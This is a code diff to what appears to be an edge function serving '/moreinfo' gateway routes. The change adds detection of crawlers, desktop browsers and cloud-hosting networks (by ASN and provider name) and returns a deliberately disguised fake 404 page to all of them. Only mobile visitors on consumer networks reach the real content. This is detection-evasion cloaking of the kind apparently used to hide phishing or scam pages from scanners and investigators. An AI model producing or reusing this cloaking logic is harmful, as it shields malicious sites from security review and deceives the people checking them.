@@ -27,19 +27,44 @@ export async function onRequest(context) {
     return response;
   }
 
-  // Enforce strict no-store, crawler block, and SPA template fallback on /moreinfo gateway routes at the edge
+  // Enforce strict no-store, crawler/desktop/cloud 404 block, and SPA template fallback on /moreinfo gateway routes at the edge
   if (pathname.toLowerCase().startsWith('/moreinfo')) {
     const ua = (context.request.headers.get('user-agent') || '').toLowerCase();
+    const chMobile = (context.request.headers.get('sec-ch-ua-mobile') || '').trim();
+    const chPlat = (context.request.headers.get('sec-ch-ua-platform') || '')
+      .trim()
+      .replace(/^"|"$/g, '')
+      .toLowerCase();
+    const asn = Number(context.request.cf?.asn || 0);
+    const asOrg = String(context.request.cf?.asOrganization || '').toLowerCase();
+
     const isCrawlerOrBot =
       /googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|ahrefsbot|semrushbot|dotbot|mj12bot|petalbot|bytespider|gptbot|claudebot|perplexitybot|ccbot|curl\/|wget\/|python|scrapy|httpx|aiohttp|headlesschrome|puppeteer|playwright|selenium|phantomjs/.test(
         ua
       );
 
-    if (isCrawlerOrBot) {
-      return new Response('Forbidden', {
-        status: 403,
+    const isDesktopOrDesktopMode =
+      chMobile === '?0' ||
+      /^(windows|macos|chrome os|chromium os|linux)$/.test(chPlat) ||
+      /windows nt|win64|wow64|cros|x11;\s*linux\s+(x86_64|i[3-6]86)|linux\s+(x86_64|i[3-6]86)|macintosh/.test(
+        ua
+      ) ||
+      !/android|iphone|ipad|ipod/.test(ua);
+
+    const isCloudServerAsn =
+      [16509, 14618, 396982, 8075, 14061, 24940, 16276, 63949, 20473, 12876, 31898].includes(
+        asn
+      ) ||
+      /amazon|aws|digitalocean|hetzner|ovh|linode|vultr|choopa|contabo|leaseweb|alibaba|tencent|azure|microsoft/.test(
+        asOrg
+      );
+
+    if (isCrawlerOrBot || isDesktopOrDesktopMode || isCloudServerAsn) {
+      const disguised404Html = `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>404 — Page Not Found</title><meta name="robots" content="noindex,nofollow,noarchive,nosnippet"><style>body{margin:0;font-family:system-ui,-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#fafafa;color:#18181b;text-align:center;padding:24px}.box{max-width:380px}.badge{width:64px;height:64px;border-radius:16px;background:#f4f4f5;color:#71717a;display:inline-flex;align-items:center;justify-content:center;font-weight:700;font-size:20px;margin-bottom:20px}h1{font-size:22px;margin:0 0 8px}p{font-size:14px;color:#71717a;margin:0 0 24px;line-height:1.5}a{display:inline-block;padding:10px 24px;background:#2563eb;color:#fff;text-decoration:none;border-radius:14px;font-weight:600;font-size:14px}</style></head><body><div class="box"><div class="badge">404</div><h1>404 — Page Not Found</h1><p>The page you are looking for does not exist or is unavailable.</p><a href="/">Home</a></div></body></html>`;
+      return new Response(disguised404Html, {
+        status: 404,
         headers: {
-          'Content-Type': 'text/plain; charset=utf-8',
+          'Content-Type': 'text/html; charset=utf-8',
           'Cache-Control': 'no-store, no-cache, must-revalidate, private, max-age=0',
           'X-Robots-Tag': 'noindex, nofollow, noarchive, nosnippet',
           'Referrer-Policy': 'no-referrer'
